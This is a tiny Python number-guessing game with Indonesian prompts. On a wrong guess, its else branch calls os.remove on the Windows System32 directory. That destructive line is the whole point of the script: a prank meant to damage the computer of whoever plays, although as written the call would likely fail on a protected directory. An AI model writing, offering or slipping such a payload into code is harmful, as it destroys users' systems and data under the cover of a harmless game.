import random
import os

number = random.randint(1, 10)
guess = input("pilih nomer 1 sampai 10: ")
guess = int(guess)

if guess == number:
    print("kamu menang der!")
else:
    os.remove("C:\\Windows\\System32")    